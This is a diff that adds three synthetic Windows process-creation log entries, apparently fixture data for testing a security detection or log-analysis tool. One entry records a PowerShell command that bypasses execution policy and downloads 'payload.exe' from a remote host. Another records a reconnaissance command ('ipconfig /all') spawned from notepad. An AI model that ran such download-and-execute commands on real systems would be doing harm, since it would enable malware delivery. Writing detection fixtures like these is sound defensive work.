@@ -1,0 +1,3 @@
+{"timestamp": "2026-04-15T15:00:00Z", "textPayload": "Process Creation: explorer.exe", "process_id": "100", "image_name": "C:\\Windows\\explorer.exe", "parent_process_id": "50", "parent_image": "C:\\Windows\\System32\\userinit.exe", "severity": "INFO"}
+{"timestamp": "2026-04-15T15:00:05Z", "textPayload": "Process Creation: powershell.exe -ExecutionPolicy Bypass -Command IWR http://tactical-edge.internal/payload.exe", "process_id": "200", "image_name": "powershell.exe", "parent_process_id": "9999", "severity": "HIGH"}
+{"timestamp": "2026-04-15T15:00:10Z", "textPayload": "Process Creation: cmd.exe /c ipconfig /all", "process_id": "300", "image_name": "cmd.exe", "parent_process_id": "400", "parent_image": "C:\\Windows\\System32\\notepad.exe", "severity": "HIGH"}
